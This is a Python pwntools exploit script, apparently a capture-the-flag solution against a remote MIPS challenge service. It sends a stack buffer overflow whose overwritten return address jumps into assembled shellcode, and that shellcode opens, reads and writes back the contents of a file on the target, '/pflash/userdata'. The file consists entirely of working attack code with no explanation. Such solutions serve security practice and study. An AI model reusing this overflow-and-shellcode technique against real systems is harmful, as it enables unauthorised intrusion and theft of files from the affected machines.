#!/usr/bin/env python3
from pwn import *

# flag{which vulnerability did you use to expolit}

context.arch = 'mips'
context.endian = 'big'

y = remote( 'chall.0ops.sjtu.edu.cn' , 9999 )

'''
0x13    sendto
0x12    recvfrom
0x11    connect
0x1e    accept
0x1d    listen
0x10    bind
0xf     socket
0x25    dump_fds
0x24    ioctl
0x22    pipe
0x20    getcwd
0x1f    chdir
0x19    traceme
0x18    brk
0x17    readdir
0x16    mkdir
0x15    mount
0x1b    dup
0x14    lseek
0xc     close

0xe     write
0xd     read
0xb     open
0xa     ps
0x8     signal
0x9     sleep

read 0x4010F0
'''
#     j 0xffdc8

sc = asm('''
    sub $sp, 0x100

    li $a1, 2
    li $a0, 0xc

    li $v0, 0x401150
    jal $v0
    nop


    li $a0, 0x25
    li $v0, 0x401150
    jal $v0
    nop


    li $a1, 1
    li $a2, 0x10
    li $a3, 0x40e2f4
    li $a0, 0x40F040

    li $v0, 0x401534
    jal $v0
    nop


    li $a1, 0x40F040
    li $a2, 0
    li $a3, 0
    li $a0, 0xb

    li $v0, 0x401150
    jal $v0
    nop


    li $a0, 0x25
    li $v0, 0x401150
    jal $v0
    nop


    li $a1, 2
    li $a2, 0xfffffef0
    li $a3, 0
    li $a0, 0x14

    li $v0, 0x401150
    jal $v0
    nop


    li $a1, 1
    li $a2, 0x70
    li $a3, 0x40e3c4
    li $a0, 0x40F040

    li $v0, 0x401534
    jal $v0
    nop


    li $a1, 1
    li $a2, 0x40F040
    li $a3, 0x70
    li $a0, 0xe

    li $v0, 0x401150
    jal $v0
    nop
''')


stdin = 0x40e2f4
stdout = 0x40e35c
stderr = 0x40e3c4
fread = 0x401534
pflash = 0x8017fbe0

p = flat(
  'a' * 20,
  0x700ffdb0 + 24,
)
p += sc
y.sendafter( 'Idle thread is running!' , p.ljust( 0x200 , b'\0' ) )

y.send( '/pflash/userdata' )

y.interactive()